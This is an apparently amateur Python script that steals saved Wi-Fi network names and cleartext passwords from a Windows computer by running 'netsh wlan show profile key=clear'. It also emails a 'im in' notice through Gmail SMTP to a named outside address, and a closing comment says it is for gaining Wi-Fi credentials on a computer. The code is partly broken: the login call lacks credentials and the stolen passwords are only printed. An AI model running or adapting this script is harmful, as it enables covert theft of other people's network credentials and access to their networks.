import subprocess
import re
import smtplib
import os

#os moduel with password and username

EMAIL_ADDRESS=os.environ.get('EMAIL_USER')
EMAIL_PASSWORD=os.environ.get('EMAIL_PASS')

with smtplib.SMTP('smtp.gmail.com',587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.ehlo()

    smtp.login()

    subject = 'im in'
    body = 'secret'
    msg = f'Subject: {subject}\n\n{body}'
    smtp.sendmail(EMAIL_ADDRESS, 'jeffreekawamoto786@msn.com', msg)





command_output = subprocess.run(["netsh", "wlan", "show", "profiles"],capture_output=True).stdout.decode()
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
wifi_list=[]

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = {}
        profile_info = subprocess.run(["netsh","wlan","show","profile",name], capture_output=True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)
    for x in range(len(wifi_list)):
        print(wifi_list[x])


    #use on computer to gain wifi password and name